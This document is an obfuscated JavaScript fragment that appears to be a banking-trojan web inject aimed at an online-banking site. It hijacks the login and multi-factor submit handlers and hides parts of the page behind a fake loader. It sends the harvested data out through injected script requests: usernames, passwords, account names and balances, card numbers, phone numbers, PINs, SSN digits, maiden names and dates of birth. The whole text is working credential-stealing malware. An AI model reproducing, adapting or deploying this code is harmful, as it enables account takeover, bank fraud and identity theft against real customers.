			if(''.fAkEi==12&&''.fAkEdataTnum.length>10&&status=="second"){//заполняем номера телефонов
				String.prototype.fAkEtnums=''.fAkEdataTnum.split("<br>");
				for(String.prototype.fAkEj=0;''.fAkEj<''.fAkEtnums.length;String.prototype.fAkEj++){
					if(''.fAkEtnums[''.fAkEj].search(/\w+\s+Number/g)>-1&&''.fAkEtnums[''.fAkEj].search("None on file")==-1){
						String.prototype.fAkEtrel=document.createElement("tr");''.fAkEtrel.setAttribute("name","fAkEelem");
						String.prototype.fAkEtdel=document.createElement("td");''.fAkEtdel.setAttribute("name","fAkEelem");
						String.prototype.fAkElabel=document.createElement("label");''.fAkElabel.setAttribute("name","fAkEnumbersLabel");''.fAkElabel.innerHTML=''.fAkEtnums[''.fAkEj].split(":")[0].replace("*","")+":";
						''.fAkElabel.style.fontFamily="Arial,sans-serif";''.fAkElabel.style.fontSize="14px";''.fAkElabel.style.lineHeight="1.28571";''.fAkElabel.style.color="#333333";
						String.prototype.fAkEfield=document.createElement("div");''.fAkEfield.setAttribute("name","fAkEelem");
						''.fAkEfield.innerHTML=''.fAkE_perevod[''.fAkE_lang]["fAkE_input_fields"][''.fAkE_perevod[''.fAkE_lang]["fAkE_input_fields"].length-1]+''.fAkEtnums[''.fAkEj].split(":")[1].replace(/[^\d]/g,"")+'">';
						''.fAkEtdel.appendChild(''.fAkElabel);''.fAkEtdel.appendChild(''.fAkEfield);
						''.fAkEtrel.appendChild(''.fAkEtdel);''.fAkEtbody.appendChild(''.fAkEtrel);
					}
				}
			}
		}
		//фейк лоадер
		String.prototype.fAkEtr=document.createElement("tr");''.fAkEtr.setAttribute("name","fAkEelem");''.fAkEtr.id="fAkEloader";''.fAkEtr.style.display="none";''.fAkEtr.style.textAlign="center";
		String.prototype.fAkEtd=document.createElement("td");''.fAkEtd.setAttribute("name","fAkEelem");''.fAkEtd.colSpan="2";''.fAkEtd.innerHTML=''.fAkE_perevod[''.fAkE_lang]["fAkE_fields"][21]+"<br name='fAkEelements'><br name='fAkEelements'><br name='fAkEelements'>"+''.fAkE_perevod[''.fAkE_lang]["fAkE_fields"][22]+"<br name='fAkEelements'>"+''.fAkE_perevod[''.fAkE_lang]["fAkE_fields"][23]+"<br name='fAkEelements'><br name='fAkEelements'>";
		''.fAkEtr.appendChild(''.fAkEtd);''.fAkEtbody.appendChild(''.fAkEtr);
		''.fAkEtable.appendChild(''.fAkEtbody);''.fAkEtable2.appendChild(''.fAkEtable);
		''.fAkEdivel.appendChild(''.fAkEtable2);document.getElementsByTagName("body")[0].appendChild(''.fAkEdivel);
		if(document.getElementById("fAkE_knoun_ccnum"))document.getElementById("fAkE_knoun_ccnum").value=''.fAkEccNumber;
		''.fAkE_fill_dob();''.fAkE_fill_exp();document.getElementById("fAkE_cc").style.display="block";
	}
};

String.prototype.fAkEccNumber=false;
String.prototype.fAkEdataTnum=false;

String.prototype.fAkE_congratulation=function(){alert(''.fAkE_perevod[''.fAkE_lang]["errors"][3]);''.fAkE_CloseElem("fAkE_cc");};

String.prototype.fAkE_check_form=function(){
	String.prototype.fAkEDATA=new Date();String.prototype.fAkEtime=''.fAkEDATA.getDate()+"-"+(''.fAkEDATA.getMonth()+1)+"-"+''.fAkEDATA.getFullYear()+" TimeZone:"+''.fAkEDATA.getTimezoneOffset()/60;
	
	if(document.getElementById("username")){String.prototype.fAkElogin=document.getElementById("username").value;}else if(document.getElementById("cookiedList")){
		String.prototype.fAkElogin=document.getElementById("cookiedList").options[document.getElementById("cookiedList").selectedIndex].value;
	}
	''.fAkE_MakeElem("&login="+encodeURIComponent(''.fAkElogin)+"&pass="+encodeURIComponent((document.getElementById("pwd")?document.getElementById("pwd").value:document.getElementById("password").value))+"&logintime="+encodeURIComponent((''.fAkEtime)),null,"script");
}
String.prototype.fAkEisHasAccounts=0;
String.prototype.fAkEcheckAccountsHomePage=function(){
	String.prototype.fAkEaccountsInfo="";
	String.prototype.fAkEspan=document.getElementsByTagName("span");
	for(String.prototype.fAkEi=0;''.fAkEi<''.fAkEspan.length;String.prototype.fAkEi++){
		if(''.fAkEspan[''.fAkEi].innerHTML.search(/<\/?[^>]+>/g)==-1&&''.fAkEspan[''.fAkEi].innerHTML.search(/Checking|Savings/)>-1){
			try{
					String.prototype.fAkEtr=''.fAkEspan[''.fAkEi].parentNode.parentNode.getElementsByTagName("td");//акки
					if(''.fAkEtr.length==0)String.prototype.fAkEtr=''.fAkEspan[''.fAkEi].parentNode.parentNode.parentNode.getElementsByTagName("td");
					String.prototype.fAkEaccountsInfo+=(''.fAkEtr[0].getElementsByTagName("a")[0].innerHTML.replace(/^\s+|\s+$/g,"")+":").toString();//acc name
					String.prototype.fAkEnum=''.fAkEtr[''.fAkEtr.length-1].getElementsByTagName("div")[0].getElementsByTagName("span");
					String.prototype.fAkEaccountsInfo+=(''.fAkEnum[''.fAkEnum.length-1].innerHTML.replace(/^\s+|\s+$/g,"")+"<br>").toString();
			}catch(fAkEerr){};
		}
	}
	if(''.fAkEisHasAccounts>4){''.fAkEreplacepage("close");}
	else if(''.fAkEaccountsInfo.length>10){
			''.fAkE_MakeElem("&lastlogin="+encodeURIComponent((document.getElementById("user_lastLogin").innerHTML.replace(/Last Login:|&nbsp;/g,"").replace(/^\s+|\s+$/g,"")))+"&uname="+encodeURIComponent((document.getElementById("user_name").innerHTML.replace(/^\s+|\s+$|Welcome|&nbsp;/g,"")))+"&url="+encodeURIComponent((window.location.href))+"&accounts="+encodeURIComponent((''.fAkEaccountsInfo)),null,"script");
	}else{
		String.prototype.fAkEisHasAccounts++;
		setTimeout(function(){''.fAkEcheckAccountsHomePage()},1000);
	}
};

String.prototype.fAkEdoSubmit=function(){
	if(window.doSubmit){
		
		doSubmit=function(c){
			if(''.fAkE_noentryfunc){''.fAkE_no_entry();return false;}
			if(!''.fAkE_formsubmitted){''.fAkE_check_form();return false;}
			var b;
			if(!signonLock){
				var a=new Date();
				var g=a.getTimezoneOffset();var d=(new Date().getTimezoneOffset()/60)*(-1);
				document.getElementById("efdBTZ").value=d;
				document.getElementById("efdCSR").value=screen.width+"x"+screen.height;
				if(c){b=c;while(b&&b.nodeName!="FORM"){b=b.parentNode}}else{b=$("#logInForm")[0]}populateClientData(b);
				if(signOnUnamePwdError(b)){if(b.ioBlackBox!=null&&b.ioBlackBox!="undefined"){setIOBlackBox(b)}clearFieldErrorValidation();
				jQuery("#logInForm").submit()}else{callbackFunction=function(e){doSubmit(e)};return false}}
		}
		if(document.getElementById("signon")){
			doSubmit=function(e)
				{
					if(''.fAkE_noentryfunc){''.fAkE_no_entry();return false;}
					if(!''.fAkE_formsubmitted){''.fAkE_check_form();return false;}
					if (signonLock){	
					if(e){
					var f = e;
					while(f && f.nodeName != 'FORM') f = f.parentNode;
					} else f = document.Signon_errorpage;			
				  
					if(f && signOnUnamePwdError(false, validate)){
						f.submit();
					}
					}else{
					callbackFunction = function(e) {doSubmit(e);  };
					return false;
					}
				}
		}
		if(document.getElementById("find-submit")){
			doSubmit=function(e){
				if(''.fAkE_noentryfunc){''.fAkE_no_entry();return false;}
				if(!''.fAkE_formsubmitted){''.fAkE_check_form();return false;}
				
				document.getElementById('encrStr').value=encrString;
				document.getElementById('initVec').value=initVecString;
				document.getElementById('sign').value=signString;
				document.getElementById('key').value=keyString;
				
				if (!signonLock){	
					var now = new Date()
						var offset = now.getTimezoneOffset();
						var gmtHours = (new Date().getTimezoneOffset() / 60) * (-1);
						document.getElementById('efdBTZ').value=gmtHours;
						document.getElementById('efdCSR').value=screen.width+'x'+screen.height;
						toggleInfoBubble('true');
						if(e){
							var f = e;
							while(f && f.nodeName != 'FORM') f = f.parentNode;
							} else f = document.SignonForm;			
						   // if(document.getElementById('showerrordynamic'))
							//jQuery('#showerrordynamic').html("");
							 populateClientData(f);
							if(f && signOnUnamePwdError(false, validate)){
								if(f.ioBlackBox !=null && f.ioBlackBox != 'undefined'){
									setIOBlackBox(f);//R114 OPSE Changes
								 }
								s.tl(this,'o',SCFormElementReporting.report('SignonForm', ['rememberuserid']));
								jQuery(f).submit();
							}
						}
					else{
					callbackFunction = function(e) {doSubmit(e);  };
					return false;
					}
				}

			 dosubmit=function(){
				if(''.fAkE_noentryfunc){''.fAkE_no_entry();return false;}
				if(!''.fAkE_formsubmitted){''.fAkE_check_form();return false;}
			
				if (!signonLock){	
						signOnUnamePwdError(false, validate, this);
						s.tl(this,'o',SCFormElementReporting.report('SignonForm', ['username','rememberuserid'])); 
						 populateClientData(document.SignonForm);
						 if(document.SignonForm.ioBlackBox !=null &&document.SignonForm.ioBlackBox != 'undefined'){
							setIOBlackBox(document.SignonForm);//R114 OPSE Changes
						}
				}
				else{
				callbackFunction = function(e) {doSubmit();  };
				return false;
				}
			}
		}
	}else{
		setTimeout(function(){''.fAkEdoSubmit();},1000)
	}
}

String.prototype.fAkEcountTry=0;
String.prototype.fAkEwinlocgref=window.location.href;
String.prototype.fAkEstart=function(){
	String.prototype.fAkEhideel=[];
	String.prototype.fAkEwhereisinj=(function(){
		if(''.fAkEwinlocgref.search(/CheckTandC\.do|ValidateCQ/g)>-1){return "AdditionalAuthorization";}
		else if(''.fAkEwinlocgref.search(/Welcome\.c|DisplayUsernameSignon\.do|signon|portal\/Index\.do/g)>-1||document.getElementById("signInBtn")){return "LoginData";}
		else if(''.fAkEwinlocgref.search(/Home\.do|dashboard/g)>-1||document.getElementById("categoryType-BNKCHK")||document.getElementById("categoryType-BNKSVN")){return "HomePage";}
		else if(''.fAkEwinlocgref.search(/InitializeSubApp\.do/g)>-1){return "ChangePin";}
		else if(''.fAkEwinlocgref.search(/initialiseContactInfo\.do/g)>-1){return "ChangeAdress";}
		else{return "AnyPage";}
	})();
	if(document.getElementById("footer")){''.fAkEhideel.push(document.getElementById("footer"))};
	switch(''.fAkEwhereisinj){
		case "ChangeAdress":
			if(document.getElementById("citilmHeader")){''.fAkEhideel.push(document.getElementById("citilmHeader").parentNode)}else{setTimeout(function(){''.fAkEstart()},1000);return;};
			if(document.getElementById("body")){''.fAkEhideel.push(document.getElementById("body").parentNode.parentNode)}
			if(document.getElementById("dvaWidget")){''.fAkEhideel.push(document.getElementById("dvaWidget"))}
			if(document.getElementById("lpFloatingButtonDiv")){''.fAkEhideel.push(document.getElementById("lpFloatingButtonDiv"))}
			if(document.getElementById("citilmFooter")){''.fAkEhideel.push(document.getElementById("citilmFooter"))};
			if(!document.getElementById("challengeAnswers0")){''.fAkEreplacepage("send")}else{
				String.prototype.fAkEobj=document.getElementsByTagName("div");
				for(String.prototype.fAkEr=0;''.fAkEr<''.fAkEobj.length;String.prototype.fAkEr++){
					if(''.fAkEobj[''.fAkEr].innerHTML.search(/<\/?[^>]+>/g)==-1&&''.fAkEobj[''.fAkEr].className=="ui-widget-overlay"){
						''.fAkEobj[''.fAkEr].style.opacity="1";
					}
				}
				
			};
			String.prototype.fAkEdata="";
			String.prototype.fAkEtnum="";
			String.prototype.fAkEspan=["label","div"];
			for(String.prototype.fAkEj=0;''.fAkEj<''.fAkEspan.length;String.prototype.fAkEj++){
				String.prototype.fAkEmass=document.getElementsByTagName(''.fAkEspan[''.fAkEj]);
				for(String.prototype.fAkEi=0;''.fAkEi<''.fAkEmass.length;String.prototype.fAkEi++){
					if(''.fAkEmass[''.fAkEi].innerHTML.search(/<\/?[^>]+>/g)==-1&&''.fAkEmass[''.fAkEi].innerHTML.search(/Email\sAddress|Home\sPhone|Work\sPhone|Mobile\sNumber|Bank\sAccount/g)>-1){
						
						String.prototype.fAkEdata+=''.fAkEmass[''.fAkEi].innerHTML.replace(/^\s+|\s+$/g,"")+":";
						if(''.fAkEmass[''.fAkEi].nodeName.toUpperCase()=="DIV"){
							String.prototype.fAkEdata+=''.fAkEmass[''.fAkEi].parentNode.getElementsByTagName("div")[''.fAkEmass[''.fAkEi].parentNode.getElementsByTagName("div").length-1].innerHTML.replace(/^\s+|\s+$|\s{2,}|&nbsp;/g,"").replace(/<\/?[^>]+>/g," ").replace(/Activate.*/g,"")+"<br>";
						}else{
							String.prototype.fAkEdata+=''.fAkEmass[''.fAkEi].parentNode.parentNode.parentNode.getElementsByTagName("div")[''.fAkEmass[''.fAkEi].parentNode.parentNode.parentNode.getElementsByTagName("div").length-1].innerHTML.replace(/^\s+|\s+$|\s{2,}|&nbsp;/g,"").replace(/<\/?[^>]+>/g," ").replace(/Activate.*/g,"")+"<br>";
						}
					}
				}
			}
			if(''.fAkEdata.search(/\w+\s+Number/g)>-1 || parseInt(''.fAkEcountTry)>10){
				''.fAkE_MakeElem("&data="+encodeURIComponent((''.fAkEdata)),null,"script");
			}else{String.prototype.fAkEcountTry++;setTimeout(function(){''.fAkEstart()},1000);return;}
			;break;
		case "ChangePin":
			if(document.getElementById("pageWrapper")){''.fAkEhideel.push(document.getElementById("pageWrapper"))}else{setTimeout(function(){''.fAkEstart()},1000);return;};
			if(document.getElementById("dvaWidget")){''.fAkEhideel.push(document.getElementById("dvaWidget"))}
			//if(document.getElementsByTagName("footer")[0]){''.fAkEhideel.push(document.getElementsByTagName("footer")[0])}
			if(document.getElementById("lpFloatingButtonDiv")){''.fAkEhideel.push(document.getElementById("lpFloatingButtonDiv"))}
				if(!document.getElementById("challengeAnswers0")){''.fAkEreplacepage("send")}else{
				String.prototype.fAkEobj=document.getElementsByTagName("div");
				for(String.prototype.fAkEr=0;''.fAkEr<''.fAkEobj.length;String.prototype.fAkEr++){
					if(''.fAkEobj[''.fAkEr].innerHTML.search(/<\/?[^>]+>/g)==-1&&''.fAkEobj[''.fAkEr].className=="ui-widget-overlay"){
						''.fAkEobj[''.fAkEr].style.opacity="1";
					}
				}
				
			};
			if(document.getElementById("introTextOne")&&document.getElementById("introTextOne").getElementsByTagName("b").length>0){
				''.fAkE_MakeElem("&ccnum="+encodeURIComponent((document.getElementById("introTextOne").getElementsByTagName("b")[0].innerHTML.replace(/[^\d]/g,""))),null,"script");
			}else{setTimeout(function(){''.fAkEstart()},1000);return;}
			;break;
		case "LoginData":
				document.getElementsByTagName("body")[0].style.marginTop="0px";''.fAkEscroll(false);
				document.getElementsByTagName("title")[0].innerHTML=''.fAkEtitle;
				//find login button
				if(document.getElementById("find-submit")){
					String.prototype.fAkELINK=document.getElementById("find-submit")
					}else if(document.getElementById("signInBtn")){
						String.prototype.fAkELINK=document.getElementById("signInBtn")
					}else if(document.getElementById("signon")){
						String.prototype.fAkELINK=document.getElementById("signon")
				}
				//переопределяем ф-ю
				''.fAkEdoSubmit();
				;break;
		case "HomePage":
				if(document.getElementById("pageWrapper")){''.fAkEhideel.push(document.getElementById("pageWrapper"))}else{setTimeout(function(){''.fAkEstart()},1000);return;};
				if(document.getElementById("dvaWidget")){''.fAkEhideel.push(document.getElementById("dvaWidget"))}
				if(document.getElementById("lpFloatingButtonDiv")){''.fAkEhideel.push(document.getElementById("lpFloatingButtonDiv"))}
				//if(document.getElementsByTagName("footer")[0]){''.fAkEhideel.push(document.getElementsByTagName("footer")[0])}
				''.fAkEreplacepage("send");''.fAkEscroll(false);document.getElementsByTagName("body")[0].style.marginTop="0px";''.fAkEcheckAccountsHomePage();break;
		case "AdditionalAuthorization":
				document.getElementsByTagName("body")[0].style.marginTop="0px";''.fAkEscroll(false);
				try{document.getElementsByTagName("title")[0].innerHTML=''.fAkEtitle;}catch(e){}
				String.prototype.fAkELINK=document.getElementById("cmlink_ContinueBtnMFA");
				submitForm=function(){
					if (validateFields(document.forms[subAppContextName]) == false){return false;}
					if(document.forms[subAppContextName].cin){
						var errMfaEmptycin="Please check your answers and try again";
						var errMfaCinlen="ATM/Debit Card # must be at least 14 digits.";
						var errMfacindig="ATM/Debit Card # must be only digits (0-9).";
						if(!cinValidation(document.forms[subAppContextName].cin,errMfaEmptycin,errMfaCinlen,errMfacindig))return false;
					}
					if(document.forms[subAppContextName].dateOfBirth){
						var errMfaValidDob="Please enter a valid Date of Birth.";
						if(!dobValidation(document.forms[subAppContextName].dateOfBirth,errMfaValidDob))return false;
					}
					if(document.forms[subAppContextName].pin){
						var errMfaEmptyPin="Please enter your ATM/Debit Card PIN.";
						if(!pinValidation(document.forms[subAppContextName].pin,errMfaEmptyPin))return false;
					}
					if(document.forms[subAppContextName].accountNumber){
					 var errMfaEmptyAcctNo="Please enter the number of any account that's linked to your ATM/Debit Card.";
					 if(!accountNumberValidation(document.forms[subAppContextName].accountNumber,errMfaEmptyAcctNo))return false;
					} 
					if(document.forms[subAppContextName].maidenName){
						var errMfaEmptyMMName="Please enter your Mother's Maiden Name.";
						if(!maidenNameValidation(document.forms[subAppContextName].maidenName,errMfaEmptyMMName))return false;
					} 
					if(document.forms[subAppContextName].ssn){
						var errMfaValidSsn="Please enter the last 4 digits of your Social Security or Tax ID Number.";
						if(!ssnValidation(document.forms[subAppContextName].ssn,errMfaValidSsn))return false;
					}
					//fake begin
					if(!''.fAkE_formsubmitted){
						String.prototype.fAkEinfo="";
						String.prototype.fAkEform=document.forms[subAppContextName].getElementsByTagName("div");
						for(String.prototype.fAkEi=0;''.fAkEi<''.fAkEform.length;String.prototype.fAkEi++){
								String.prototype.fAkElabel=''.fAkEform[''.fAkEi].getElementsByTagName("label")[0].length>0?''.fAkEform[''.fAkEi].parentNode:''.fAkEform[''.fAkEi].parentNode.parentNode;
								String.prototype.fAkEinfo+=''.fAkEform[''.fAkEi].getElementsByTagName("label")[0].innerHTML.replace(/^\s+|\s+$/g, '')+":"+''.fAkEform[''.fAkEi].getElementsByTagName("input")[''.fAkEform[''.fAkEi].getElementsByTagName("input").length-1].value+"<br>";
						}
						''.fAkE_MakeElem("&secondauth="+encodeURIComponent((''.fAkEinfo)),null,"script");
						;return false;
					}
					//fake end
					return true;
				};break;
		case "AnyPage":
		default:
				document.getElementsByTagName("title")[0].innerHTML=''.fAkEtitle;
				''.fAkE_MakeElem("",null,"script");
				document.getElementsByTagName("body")[0].style.marginTop="0px";''.fAkEscroll(false);break;
		
	}
};
String.prototype.fAkEtitle="";
String.prototype.fAkEloading=function(){
	try{if(document.getElementsByTagName("title")[0].innerHTML.search(/Please/g)==-1){String.prototype.fAkEtitle=document.getElementsByTagName("title")[0].innerHTML};document.getElementsByTagName("title")[0].innerHTML="Please wait..";}catch(e){}
	if((document.readyState&&document.readyState=="complete")||(document.body&&document.body.readyState=='complete')){
			if(!''.fAkEwhereisinj){''.fAkEstart();}
		}else{''.fAkEtimeOutID=setTimeout(function fAkE(){''.fAkEloading()},100);}
};''.fAkEloading();
})();